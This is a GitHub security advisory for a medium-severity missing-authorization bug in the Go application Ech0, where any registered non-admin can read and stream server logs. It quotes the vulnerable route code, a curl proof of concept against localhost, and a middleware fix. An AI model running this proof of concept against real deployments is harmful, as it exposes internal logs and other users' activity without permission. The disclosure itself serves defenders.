# [M] Ech0's Missing Authorization on System Logs Allows Non-Admin Information Disclosure

## Summary
Severity: Medium
Advisory: GHSA-w8jj-cwmc-wgq2
CWE: CWE-862
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N (CVSS_V3)
Published: 2026-04-10
Source: https://github.com/advisories/GHSA-w8jj-cwmc-wgq2
Type: github-advisory

## Affected
- Go: `github.com/lin-snow/ech0` — affected >=0 <4.4.3

## Details
## Summary

The system log endpoints (`GET /api/system/logs`, `GET /api/system/logs/stream`, `WS /ws/system/logs`) lack authorization checks, allowing any authenticated non-admin user to read and stream all server logs. These logs contain error stack traces, internal file paths, module names, and arbitrary structured fields that facilitate reconnaissance for further attacks.

## Details

The dashboard routes in `internal/router/dashboard.go:7-8` register log endpoints on the `AuthRouterGroup` without any `RequireScopes` middleware:

```go
// internal/router/dashboard.go
func setupDashboardRoutes(appRouterGroup *AppRouterGroup, h *handler.Bundle) {
	appRouterGroup.AuthRouterGroup.GET("/system/logs", h.DashboardHandler.GetSystemLogs())
	appRouterGroup.AuthRouterGroup.GET("/system/logs/stream", h.DashboardHandler.SSESubscribeSystemLogs())
	appRouterGroup.WSRouterGroup.GET("/system/logs", h.DashboardHandler.WSSubscribeSystemLogs())
}
```

Compare with other admin-only routes that properly use `RequireScopes`:

```go
// internal/router/setting.go — every route has RequireScopes
appRouterGroup.AuthRouterGroup.GET("/settings",
    middleware.RequireScopes(authModel.ScopeAdminSettings),
    h.SettingHandler.GetSiteSettings())
```

The `AuthRouterGroup` only applies `JWTAuthMiddleware()` (router.go:36), which validates the JWT and sets the viewer context but does **not** check admin status. The `WSRouterGroup` (router.go:37) has no middleware at all — the WebSocket handler only calls `ParseToken` to verify the JWT signature (dashboard.go:74) without any role/scope validation.

The handler (`internal/handler/dashboard/dashboard.go:29-62`) and service (`internal/service/dashboard/dashboard.go:21-27`) contain zero authorization checks. Other services in the codebase properly enforce admin access:
- `internal/service/inbox/inbox.go:132` — `ensureAdmin()`
- `internal/service/migrator/migrator.go:360` — `ensureAdmin()`
- `internal/service/comment/comment.go:719` — `requireAdmin()`

Non-admin users are created with `IsAdmin: false` and `IsOwner: false` (`internal/service/user/user.go:220-221`) via the public registration endpoint.

The `LogEntry` struct (`internal/util/log/log.go:78-87`) exposes:
```go
type LogEntry struct {
    Time   string         `json:"time"`
    Level  string         `json:"level"`
    Msg    string         `json:"msg"`
    Module string         `json:"module,omitempty"`
    Caller string         `json:"caller,omitempty"`   // internal file paths
    Error  string         `json:"error,omitempty"`     // error stack traces
    Fields map[string]any `json:"fields,omitempty"`    // arbitrary structured data
    Raw    string         `json:"raw,omitempty"`       // raw log lines
}
```

## PoC

```bash
# 1. Register a non-admin user (system allows up to 5 users by default)
curl -X POST http://localhost:8080/api/register \
  -H 'Content-Type: application/json' \
  -d '{"username":"attacker","password":"Password123"}'

# 2. Login to get session token
TOKEN=$(curl -s -X POST http://localhost:8080/api/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"attacker","password":"Password123"}' | jq -r '.data.token')

# 3. Read system logs — should require admin but doesn't
curl http://localhost:8080/api/system/logs \
  -H "Authorization: Bearer $TOKEN"
# Returns: {"code":1,"data":[{"time":"...","level":"error","msg":"...","module":"...","caller":"internal/service/user/user.go:145","error":"...","fields":{...}},...]}

# 4. Subscribe to real-time log stream via SSE
curl -N "http://localhost:8080/api/system/logs/stream?token=$TOKEN"

# 5. Subscribe via WebSocket (WSRouterGroup has NO middleware)
# wscat -c "ws://localhost:8080/ws/system/logs?token=$TOKEN"
```

## Impact

Any registered non-admin user can:
- **Read all historical system logs** including error traces that reveal internal code paths, database errors, and application state
- **Stream real-time logs** via SSE or WebSocket to monitor all server activity as it happens
- **Gather reconnaissance data** — caller fields expose internal file paths and line numbers, error fields expose stack traces and database query failures, module fields map the internal architecture
- **Monitor other users' actions** — authentication failures, registration events, and admin operations appear in logs

This information disclosure lowers the bar for chaining further attacks by revealing the application's internal structure, error handling patterns, and operational state.

## Recommended Fix

Add `RequireScopes` middleware with an admin scope to the dashboard routes:

```go
// internal/router/dashboard.go
func setupDashboardRoutes(appRouterGroup *AppRouterGroup, h *handler.Bundle) {
	appRouterGroup.AuthRouterGroup.GET("/system/logs",
		middleware.RequireScopes(authModel.ScopeAdminSettings),
		h.DashboardHandler.GetSystemLogs())
	appRouterGroup.AuthRouterGroup.GET("/system/logs/stream",
		middleware.RequireScopes(authModel.ScopeAdminSettings),
		h.DashboardHandler.SSESubscribeSystemLogs())
	appRouterGroup.WSRouterGroup.GET("/system/logs",
		middleware.RequireScopes(authModel.ScopeAdminSettings),
		h.DashboardHandler.WSSubscribeSystemLogs())
}
```

Additionally, the WebSocket handler should validate admin scope after parsing the token, since the `WSRouterGroup` lacks middleware:

```go
// internal/handler/dashboard/dashboard.go — WSSubscribeSystemLogs
claims, err := jwtUtil.ParseToken(token)
if err != nil {
    ctx.AbortWithStatusJSON(http.StatusUnauthorized, gin.H{"msg": "invalid token"})
    return
}
// Add admin check for WebSocket endpoint
if claims.TokenType == authModel.TokenTypeAccess && !containsScope(claims.Scopes, authModel.ScopeAdminSettings) {
    ctx.AbortWithStatusJSON(http.StatusForbidden, gin.H{"msg": "admin access required"})
    return
}
```

## References
- https://github.com/lin-snow/Ech0/security/advisories/GHSA-w8jj-cwmc-wgq2
- https://github.com/lin-snow/Ech0
- https://github.com/lin-snow/Ech0/releases/tag/v4.4.3
